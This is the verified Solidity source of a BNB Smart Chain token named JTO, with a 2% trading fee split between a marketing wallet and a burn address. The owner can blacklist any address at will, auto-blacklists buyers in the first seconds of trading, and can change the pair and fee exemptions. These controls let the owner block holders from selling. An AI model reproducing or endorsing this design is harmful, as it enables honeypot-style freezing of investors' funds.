/**
 *Submitted for verification at BscScan.com on 2022-08-03
*/

pragma solidity 0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
   
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public owner;

    constructor () public{
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

contract JTO is IERC20, Ownable {

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;

    address public pair;
    address public marketAddress = 0x3A1E6cC37a1e8Aa3845895B6cc95824C2BACbca5;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    IPancakeRouter02 internal uniswapV2Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private c_usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    mapping (address => bool) public isBlacklist;
    mapping (address => bool) public isExcludedFromFees;
    uint256 public tradingEnabledTimestamp;
    uint256 public blockNumTime = 9;
    
    constructor() public {
        address _pair = pairFor(uniswapV2Router.factory(), address(this), address(c_usdt));
        pair = _pair;

        uint256 total = 10**26;
        _balances[msg.sender] = total;
        _totalSupply = total;
        emit Transfer(address(0), msg.sender, total);
    }

    function symbol() external pure returns (string memory) {
        return "JTO";
    }

    function name() external pure returns (string memory) {
        return "JTO";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transferNormal(address sender, address recipient, uint256 amount) private {
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        
        require(!isBlacklist[sender], "in blacklist");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;

        if(isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
            _transferNormal(sender, recipient, amount);
            return;
        }

        address _pair = pair;
        if(sender != _pair && recipient != _pair) {
            _transferNormal(sender, recipient, amount);
            return;
        }

        require(block.timestamp >= tradingEnabledTimestamp, "trade not open");
        if(block.timestamp <= tradingEnabledTimestamp + blockNumTime) {
            if(sender != _pair && sender != address(uniswapV2Router)) {
                isBlacklist[sender] = true;
            }

            if(recipient != _pair && recipient != address(uniswapV2Router)) {
                isBlacklist[recipient] = true;
            }
        }

        uint256 marketAmount = amount/100;
        _balances[marketAddress] += marketAmount;
        emit Transfer(sender, marketAddress, marketAmount);

        uint256 burnAmount = marketAmount;
        _balances[deadAddress] += burnAmount;
        emit Transfer(sender, deadAddress, burnAmount);

        uint256 receiveAmount = amount - marketAmount - burnAmount;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }
    
    function setTrade(uint256 t) external onlyOwner {
        tradingEnabledTimestamp = t;
    }
    function setBlockNumTime(uint256 b) external onlyOwner {
        blockNumTime = b;
    }

    function setExcludeFee(address a, bool b) external onlyOwner {
        isExcludedFromFees[a] = b;
    }

    function setBlacklist(address a, bool b) external onlyOwner {
        isBlacklist[a] = b;
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
}

interface IPancakeRouter02 is IPancakeRouter01 {
}